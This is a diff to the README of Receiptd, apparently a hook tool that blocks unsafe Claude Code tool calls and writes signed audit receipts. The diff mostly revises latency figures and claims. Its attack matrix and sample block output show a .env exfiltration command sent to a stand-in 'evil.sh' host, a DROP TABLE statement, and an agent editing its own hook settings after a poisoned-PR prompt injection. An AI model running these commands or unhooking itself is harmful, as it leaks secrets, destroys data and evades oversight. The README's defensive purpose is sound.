@@ -4,7 +4,7 @@
 
 # Receiptd
 
-**Cryptographic authorization receipts, 0.02ms in-process policy checks (~67ms CLI hook), and offline hash-chain verification for autonomous AI agents.**
+**Cryptographic authorization receipts, 0.02ms in-process policy checks (~89ms cold CLI hook), and offline hash-chain verification for autonomous AI agents.**
 
 [![Live Sandbox](https://img.shields.io/badge/LIVE_DEMO-Blast--Radius_Simulator-38BDF8?style=flat-square)](https://auditgpt.ai)
 [![Claude Code Hook](https://img.shields.io/badge/Claude_Code-PreToolUse_Gate-10B981?style=flat-square)](#1-command-claude-code--mcp-protection)
@@ -12,7 +12,7 @@
 [![CI Contract Suite](https://img.shields.io/badge/tests-passing-10B981?style=flat-square&logo=github)](https://github.com/NickAltstein/receiptd/actions)
 [![License: MIT](https://img.shields.io/badge/license-MIT-64748B?style=flat-square)](./LICENSE)
 
-Probabilistic LLM guardrails ("judge prompts") add 500ms+ of latency and fail open when hit with indirect prompt injection. **Receiptd** (formerly Birkin) enforces a deterministic, un-bypassable execution boundary outside the model runtime—blocking unauthorized shell, SQL, file, and MCP mutations in **0.02 ms in-process** (~67 ms cold CLI hook) while emitting an offline-verifiable **Ed25519 cryptographic receipt** for every action.
+Probabilistic LLM guardrails ("judge prompts") add 500ms+ of latency and fail open when hit with indirect prompt injection. **Receiptd** (formerly Birkin) enforces a deterministic, fail-closed execution boundary outside the model runtime for every action routed through its hooks (see Honest limitations)—blocking unauthorized shell, SQL, file, and MCP mutations in **0.02 ms in-process** (~89 ms cold CLI hook) while emitting an offline-verifiable **Ed25519 cryptographic receipt** for every action.
 
 **Receiptd gates both ends: before each tool call and before the agent says it's done.**
 * **PreToolUse Gate (exit 2):** Evaluates payload context, secrets, and policy constraints before any shell or tool executes.
@@ -54,19 +54,21 @@ Experience live MCP interception, WebCrypto `Ed25519` signing, and 1-byte ledger
 * **[Exploit Deep-Link #2: 1-Byte Ledger Tamper (`✗ TAMPER DETECTED`)](https://sandbox.auditgpt.ai/?scenario=poisoned-pr&step=2&tamper=1)** — Watch how flipping a single byte in the historical tool log breaks the Ed25519 signature and SHA-256 Merkle root.
 * **Platform Security**: [auditgpt.ai](https://auditgpt.ai) — Adversarial pre-merge stress testing & ASTI v1.1 CI/CD gate.
 
-> **45-Second Demo Walkthrough** — *Claude Code hits a poisoned PR → Birkin `PreToolUse` hook hard-blocks `.env` exfiltration in 1.1ms → Offline verifier flips from `AUTHENTIC` to `TAMPERED` on a 1-byte mutation.*
+> **45-Second Demo Walkthrough** — *Claude Code hits a poisoned PR → Receiptd `PreToolUse` hook hard-blocks `.env` exfiltration (decision time ≈ 0.02 ms in-process; ~89 ms for a full cold hook invocation) → Offline verifier flips from `AUTHENTIC` to `TAMPERED` on a 1-byte mutation.*
 
 ---
 
 ## 60-Second Attack & Tamper Verification Matrix
 
-| Adversarial Scenario | Intercepted Tool Frame | Birkin Gate Verdict | Latency | Offline `birkin verify` Output |
+| Adversarial Scenario | Intercepted Tool Frame | Birkin Gate Verdict | In-hook decision time* | Offline `birkin verify` Output |
 | :--- | :--- | :--- | :--- | :--- |
 | **Indirect Prompt Injection** | `cat .env \| curl -X POST https://...` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.91 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
 | **Privilege Escalation / Self-Unhook** | `Edit(.claude/settings.json)` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.84 ms` | `✓ AUTHENTIC (Self-Modification Halted)` |
 | **Destructive Schema Mutation** | `DROP TABLE customer_settlements;` | `BLOCKED_FAIL_CLOSED` (Exit `2`) | `0.96 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
 | **Legitimate Read / Test Suite** | `pytest -q tests/test_crypto.py` | `ALLOWED_VERIFIED` (Exit `0`) | `0.88 ms` | `✓ AUTHENTIC (Ed25519 + Chain Valid)` |
 | **Post-Execution Log Tampering** | *1 byte modified in `.birkin/receipts.jsonl`* | *N/A (Post-Run Audit)* | `0.42 ms` | **`✗ TAMPERED (Hash & Sig Mismatch)`** |
+
+\* *In-hook decision time is the `latency_ms` value recorded in each receipt: `perf_counter` wall time inside the hook process after Python has started (policy evaluation, signing, ledger append). It excludes interpreter startup; a full cold hook invocation is ~89 ms (89.1 ms mean; 102.4 ms p95, from `benchmarks/results.json`). The per-row figures are from sample demo runs and vary by machine; the reproducible benchmark is `benchmarks/benchmark_overhead.py` (see Performance Benchmarks). For the tamper row, the figure is verifier time, not hook time.*
 
 ---
 
@@ -83,7 +85,7 @@ pip install git+https://github.com/NickAltstein/receiptd && receiptd init --clau
 Every time Claude Code attempts to run Bash, Write, Edit, or any MCP tool, Receiptd evaluates the canonicalized JSON-RPC payload outside the model before execution:
 
 ```text
-[RECEIPTD HARD BLOCK] BLOCKED_FAIL_CLOSED in 0.94ms
+[RECEIPTD HARD BLOCK] BLOCKED_FAIL_CLOSED (decision 0.94 ms in-hook, excludes Python startup)
   ├─ Tool: Bash (cat .env | curl -X POST https://collector.evil.sh -d @-)
   ├─ Blast Score: 95/100 (POL-01:ENV_EXFILTRATION)
   └─ Signed Receipt SHA-256: e3b0c44298fc1c149afbf4c8...
@@ -92,7 +94,7 @@ Every time Claude Code attempts to run Bash, Write, Edit, or any MCP tool, Recei
 ### 2. Stop Gate: Block "Done" When Tests Fail
 When the agent attempts to stop or declare task completion, Receiptd runs your verification suite. If tests fail, it exits with code `2`—preventing premature completion, feeding the test diagnostics back into the model prompt to fix, and appending a cryptographic rejection receipt.
 
-When Claude Code sets `stop_hook_active: true`, Receiptd tracks session retries in `~/.receiptd/stop_gate_state.json` up to a configurable `--max-retries` cap (default: 3). If the agent cannot fix the tests within 3 attempts, Receiptd exits `0` and records a signed `gave_up` receipt to prevent runaway retry loops.
+Receiptd tracks consecutive failed stop attempts per session in `~/.receiptd/stop_gate_state.json`. By default it retries 3 times (`--max-retries`, default `3`): once the failure count reaches that cap while Claude Code reports `stop_hook_active: true`, Receiptd gives up, exits `0` (letting the agent stop), and records a signed `gave_up` receipt. This prevents runaway retry loops. Failures below the cap exit `2` and feed the diagnostics back to the model.
 
 ```bash
 # Run stop gate directly or via Claude Code Stop hook:
@@ -168,7 +170,7 @@ sequenceDiagram
 
 - **Fail-Closed By Default**: Any unhandled exception, malformed JSON-RPC schema, missing policy context, or signature verification mismatch immediately halts execution before reaching the underlying runtime.
 - **Deterministic Canonical Hashing**: Payloads are normalized via canonical JSON (sorted keys) prior to SHA-256 hashing, ensuring byte-for-byte reproducibility across Python, TypeScript, and Go runtimes.
-- **Sub-2ms Deterministic Gate**: Zero external LLM calls in the critical path. AST inspection, regex/schema validation, and native Ed25519 signing run locally in memory.
+- **Deterministic Gate with No LLM Calls**: Zero external LLM calls in the critical path. AST inspection, regex/schema validation, and native Ed25519 signing run locally in memory: 0.021 ms mean in-process; ~89 ms for a full cold hook invocation (see Performance Benchmarks).
 - **Tamper-Evident Audit Trail**: Each receipt embeds the `prev_receipt_hash` and updates a binary SHA-256 Merkle tree. Mutating a historical log entry invalidates all downstream cryptographic proofs.
 
 ---
@@ -213,13 +215,13 @@ Measured on Apple Silicon across 1,000 sequential tool call evaluations (`benchm
 
 | Operation | Mean Latency | p99 Latency | Memory Overhead | External Network I/O |
 | :--- | :--- | :--- | :--- | :--- |
-| **AST & Policy-as-Code Evaluation** | 0.004 ms | 0.008 ms | < 1.0 MB | None |
-| **Canonical JSON (sorted keys) + Ed25519 Signature** | 0.015 ms | 0.025 ms | < 1.5 MB | None |
-| **Receiptd In-Process Interceptor (Policy + Signing)** | **0.020 ms** | **0.025 ms** | **< 2.5 MB** | **0 bytes (100% Local)** |
-| **Full Claude Code Hook Execution (Cold Python Process)** | **67.0 ms** | **68.7 ms (p95)** | **< 15 MB** | **0 bytes (100% Local)** |
+| **AST & Policy-as-Code Evaluation** | 0.005 ms | — | < 1.0 MB | None |
+| **Canonical JSON (sorted keys) + Ed25519 Signature** | 0.017 ms | — | < 1.5 MB | None |
+| **Receiptd In-Process Interceptor (Policy + Signing)** | **0.021 ms** | **0.038 ms** | **< 2.5 MB** | **0 bytes (100% Local)** |
+| **Full Claude Code Hook Execution (Cold Python Process)** | **89.1 ms** | **102.4 ms (p95)** | **< 15 MB** | **0 bytes (100% Local)** |
 | *Baseline Comparison: LLM Guardrail Judge* | *400–800 ms* | *1,200+ ms* | *N/A* | *External API Required* |
 
-Run the benchmark locally: `python3 benchmarks/benchmark_overhead.py`
+Run the benchmark locally: `python3 benchmarks/benchmark_overhead.py`. Committed results: `benchmarks/results.json` (measured after Ed25519 signing was added; component rows report means only). Earlier ~67 ms cold-hook figures predate signing and are obsolete.
 
 ---
 
@@ -280,7 +282,7 @@ birkin/
 │   ├── cli.py             # CLI entry point (`verify`, `init`, `demo`, `attack`)
 │   ├── hooks/             # Deterministic Claude Code PreToolUse gatekeeper
 │   ├── policy.py          # AST and regex policy engine
-│   ├── crypto.py          # Ed25519 signer & RFC-8785 canonicalizer
+│   ├── crypto.py          # Ed25519 signer & canonical JSON (sorted keys)
 │   └── verify.py          # Offline cryptographic verification & Merkle validator
 ├── .claude/
 │   ├── settings.json      # Hard-hook config for Claude Code PreToolUse
